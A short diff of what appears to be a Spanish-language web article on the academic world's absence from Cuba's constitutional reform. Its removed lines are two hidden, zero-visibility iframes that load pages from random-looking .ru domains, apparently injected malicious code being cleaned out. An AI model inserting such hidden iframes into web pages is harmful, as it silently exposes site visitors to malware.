@@ -22,5 +22,3 @@ La Academia, a mi modesto entender, ha sido la gran ausente en este proceso. No 
 La ausencia de especialistas versados en temas a los que una Constitución moderna no puede ser indiferente puede redundar en un serio perjuicio para los destinatarios de la norma. No se trata solamente que se le de un tratamiento inadecuado a tal o más cual institución, sino que por desconocimiento del constituyente ni siquiera se le preste atención. Esos y otros tantos aspectos que deben ser saneados proyectan incertidumbre sobre un proceso más que esperado y en torno al cual los cubanos nos hemos creado espectativas.
 
 [Otros textos del autor](/izquierdista-de-derecha/)
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
